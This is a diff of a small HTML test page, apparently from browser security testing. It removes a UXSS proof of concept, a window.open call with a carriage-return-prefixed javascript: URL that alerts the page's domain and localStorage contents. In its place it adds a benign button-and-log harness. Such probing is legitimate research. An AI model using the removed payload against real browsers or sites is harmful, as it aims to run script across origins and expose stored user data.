@@ -1,7 +1,13 @@
 <!doctype html><html><body>
+<button id="b" style="font-size:40px;padding:30px">TAP ME</button>
+<div id="log"></div>
 <script>
-  setTimeout(() => {
-    window.open("\rjavascript:alert('UXSS '+document.domain+' / '+JSON.stringify(localStorage))");
-  }, 500);
+  const log = (m) => document.getElementById('log').innerHTML += m + '<br>';
+  log('iframe loaded, origin: ' + location.origin);
+  document.getElementById('b').onclick = () => {
+    log('click fired, calling window.open...');
+    const w = window.open('https://example.com/');
+    log('window.open returned: ' + w);
+  };
 </script>
 </body></html>
